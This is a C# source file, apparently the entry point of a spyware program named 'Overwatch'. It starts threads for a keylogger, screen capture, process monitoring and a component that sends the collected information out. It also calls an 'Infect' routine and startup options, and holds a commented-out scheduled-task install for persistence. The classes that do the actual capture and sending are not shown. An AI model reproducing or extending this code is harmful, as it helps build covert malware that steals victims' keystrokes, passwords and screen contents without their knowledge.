﻿using System;
using System.Threading;

namespace Overwatch
{
    class cMain
    {
        static appLog Log = new appLog();
        static cReceiveInformation info = new cReceiveInformation();
        static cKeylogger k = new cKeylogger();
        //static cInstallTaskScheduler T = new cInstallTaskScheduler();
        static cSendingInformation s = new cSendingInformation();
        static Thread KeyTread = new Thread(k.Start);
        static Thread ScreenTread = new Thread(info.ScreenShoot);
        static Thread SendingTread = new Thread(s.Sending);
        static Thread ProcessTread = new Thread(info.Overview); 
        
        public static void Start()
        {
            KeyTread.Start();
            ScreenTread.Start();
            ProcessTread.Start();
            SendingTread.Start();
        }

        public static void Abort()
        {
            KeyTread.Abort();
            ScreenTread.Abort();
            ProcessTread.Abort();
        }
        static void Main(string[] args)
        {
            try
            {

                cStartupOptions.ProcessStartInfo();
                cChangeLabel.Infect(args);
                Start();
            }
            catch (Exception ex) { Log.Write(ex.Message, true); }
        }
    }
}
